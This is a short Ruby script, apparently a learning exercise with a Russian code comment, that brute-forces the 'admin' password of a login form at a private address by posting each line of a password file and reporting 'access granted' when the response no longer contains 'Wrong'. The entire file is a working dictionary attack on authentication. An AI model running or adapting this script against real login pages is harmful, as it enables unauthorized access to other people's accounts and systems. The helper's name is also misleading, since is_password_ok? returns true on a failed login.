require 'net/http'
require 'uri'


def is_password_ok?(pass) #! если функция называется is_ то есть возвращает true/false то в названии должен быть "?"
  uri = URI.parse('http://192.168.1.20:4567/login')
  response = Net::HTTP.post_form(uri, "username" => "admin", "password" => pass).body
#  puts response
  response.include? "Wrong"

end

input = File.open('passwords.txt','r')
  input.readlines.each do |line|
    line.strip!
    puts "Trying #{line}..."
    if is_password_ok?(line)
      puts "error"
    else
      puts "access granted!"
      puts "Password is \"#{line}\" =)"
      exit
      input.close
    end
  end





